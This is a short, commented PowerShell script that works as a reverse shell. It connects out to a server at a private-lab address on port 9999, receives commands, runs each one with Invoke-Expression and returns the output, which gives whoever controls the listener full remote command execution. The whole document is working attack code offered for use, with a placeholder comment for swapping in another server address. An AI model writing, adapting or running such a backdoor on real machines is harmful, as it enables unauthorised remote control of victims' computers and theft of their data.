# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9999

# Create a TCP client object
$tcpClient = New-Object System.Net.Sockets.TcpClient

# Connect to the server
$tcpClient.Connect($SERVER_HOST, $SERVER_PORT)

# Create a stream object for sending and receiving data
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Receive commands from the server and execute them
while ($true) {
    # Receive command from server
    $command = $reader.ReadLine()
    if ([string]::IsNullOrEmpty($command)) {
        break
    }

    # Execute the command and retrieve the output
    $output = Invoke-Expression $command

    # Send the output back to the server
    $writer.WriteLine($output)
    $writer.Flush()
}

# Close the connection
$stream.Close()
$tcpClient.Close()
